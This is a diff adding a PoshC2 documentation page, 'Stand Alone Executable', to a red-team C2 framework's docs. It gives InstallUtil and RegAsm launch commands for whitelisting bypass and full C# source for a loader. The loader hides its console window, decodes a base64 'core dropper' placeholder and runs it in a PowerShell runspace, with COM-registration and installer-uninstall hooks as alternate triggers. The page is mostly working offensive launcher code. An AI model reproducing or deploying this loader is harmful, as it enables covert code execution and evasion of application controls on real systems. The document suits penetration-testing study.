@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2 current"><a class="current reference internal" href="#">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -178,6 +179,132 @@
             
   <div class="section" id="stand-alone-executable">
 <h1>Stand Alone Executable<a class="headerlink" href="#stand-alone-executable" title="Permalink to this headline">¶</a></h1>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1086">Powershell</a></p>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1118">InstallUtil</a></p>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1121">RegAsm</a></p>
+<p>The following C# code creates the stand alone executable used in PoshC2. The code essentially creates a new Powershell Runspace using the System.Management.Automation.dll (v2.0.50727) that is supplied with the project. This executable is not signed.</p>
+<p>This can be called directly:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">.</span>\<span class="n">Posh</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Or called using InstallUtil:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Microsoft</span><span class="o">.</span><span class="n">NET</span>\<span class="n">Framework</span>\<span class="n">v4</span><span class="o">.</span><span class="mf">0.30319</span>\<span class="n">InstallUtil</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">logfile</span><span class="o">=</span> <span class="o">/</span><span class="n">LogToConsole</span><span class="o">=</span><span class="n">false</span> <span class="o">/</span><span class="n">U</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">Posh</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Or called using RegAsm:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Microsoft</span><span class="o">.</span><span class="n">NET</span>\<span class="n">Framework</span>\<span class="n">v4</span><span class="o">.</span><span class="mf">0.30319</span>\<span class="n">regasm</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">U</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">Posh</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>C# Code:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Diagnostics</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Reflection</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Configuration</span><span class="o">.</span><span class="n">Install</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">InteropServices</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Collections</span><span class="o">.</span><span class="n">ObjectModel</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="o">.</span><span class="n">Runspaces</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">EnterpriseServices</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s2">&quot;kernel32.dll&quot;</span><span class="p">)]</span>
+        <span class="n">static</span> <span class="n">extern</span> <span class="n">IntPtr</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+        <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s2">&quot;user32.dll&quot;</span><span class="p">)]</span>
+        <span class="n">static</span> <span class="n">extern</span> <span class="nb">bool</span> <span class="n">ShowWindow</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="nb">int</span> <span class="n">nCmdShow</span><span class="p">);</span>
+        <span class="n">public</span> <span class="n">const</span> <span class="nb">int</span> <span class="n">SW_HIDE</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">public</span> <span class="n">const</span> <span class="nb">int</span> <span class="n">SW_SHOW</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;&lt;base64 encoded core dropper&gt;&quot;</span><span class="p">;</span>
+        <span class="n">public</span> <span class="n">Program</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">try</span>
+            <span class="p">{</span>
+                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">p</span><span class="p">));</span>
+                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">catch</span>
+            <span class="p">{</span>
+                <span class="n">Main</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Runspace</span> <span class="n">newrunspace</span> <span class="o">=</span> <span class="n">RunspaceFactory</span><span class="o">.</span><span class="n">CreateRunspace</span><span class="p">();</span>
+            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
+            <span class="n">RunspaceInvoke</span> <span class="n">scriptInvoker</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RunspaceInvoke</span><span class="p">(</span><span class="n">newrunspace</span><span class="p">);</span>
+            <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="o">=</span> <span class="n">newrunspace</span><span class="o">.</span><span class="n">CreatePipeline</span><span class="p">();</span>
+
+            <span class="n">pipeline</span><span class="o">.</span><span class="n">Commands</span><span class="o">.</span><span class="n">AddScript</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+            <span class="n">Collection</span><span class="o">&lt;</span><span class="n">PSObject</span><span class="o">&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">Invoke</span><span class="p">();</span>
+            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
+
+            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+            <span class="n">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">results</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">stringBuilder</span><span class="o">.</span><span class="n">Append</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="n">ToString</span><span class="p">()</span><span class="o">.</span><span class="n">Trim</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">var</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">GetConsoleWindow</span><span class="p">();</span>
+            <span class="n">ShowWindow</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+            <span class="k">try</span>
+            <span class="p">{</span>
+                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">p</span><span class="p">));</span>
+                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">catch</span>
+            <span class="p">{</span>
+                <span class="n">Main</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="n">public</span> <span class="k">class</span> <span class="nc">Bypass</span> <span class="p">:</span> <span class="n">ServicedComponent</span>
+<span class="p">{</span>
+        <span class="p">[</span><span class="n">ComRegisterFunction</span><span class="p">]</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">RegisterClass</span> <span class="p">(</span> <span class="n">string</span> <span class="n">key</span> <span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">Program</span><span class="o">.</span><span class="n">Main</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="p">[</span><span class="n">ComUnregisterFunction</span><span class="p">]</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">UnRegisterClass</span> <span class="p">(</span> <span class="n">string</span> <span class="n">key</span> <span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">Program</span><span class="o">.</span><span class="n">Main</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">ComponentModel</span><span class="o">.</span><span class="n">RunInstaller</span><span class="p">(</span><span class="n">true</span><span class="p">)]</span>
+<span class="n">public</span> <span class="k">class</span> <span class="nc">Sample</span> <span class="p">:</span> <span class="n">System</span><span class="o">.</span><span class="n">Configuration</span><span class="o">.</span><span class="n">Install</span><span class="o">.</span><span class="n">Installer</span>
+<span class="p">{</span>
+    <span class="n">public</span> <span class="n">override</span> <span class="n">void</span> <span class="n">Uninstall</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Collections</span><span class="o">.</span><span class="n">IDictionary</span> <span class="n">savedState</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Program</span><span class="o">.</span><span class="n">Main</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Runspace</span> <span class="n">newrunspace</span> <span class="o">=</span> <span class="n">RunspaceFactory</span><span class="o">.</span><span class="n">CreateRunspace</span><span class="p">();</span>
+        <span class="n">newrunspace</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
+        <span class="n">RunspaceInvoke</span> <span class="n">scriptInvoker</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RunspaceInvoke</span><span class="p">(</span><span class="n">newrunspace</span><span class="p">);</span>
+        <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="o">=</span> <span class="n">newrunspace</span><span class="o">.</span><span class="n">CreatePipeline</span><span class="p">();</span>
+
+        <span class="n">pipeline</span><span class="o">.</span><span class="n">Commands</span><span class="o">.</span><span class="n">AddScript</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+        <span class="n">Collection</span><span class="o">&lt;</span><span class="n">PSObject</span><span class="o">&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">Invoke</span><span class="p">();</span>
+        <span class="n">newrunspace</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
+
+        <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+        <span class="n">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">results</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">stringBuilder</span><span class="o">.</span><span class="n">Append</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="n">ToString</span><span class="p">()</span><span class="o">.</span><span class="n">Trim</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
 </div>
 
 
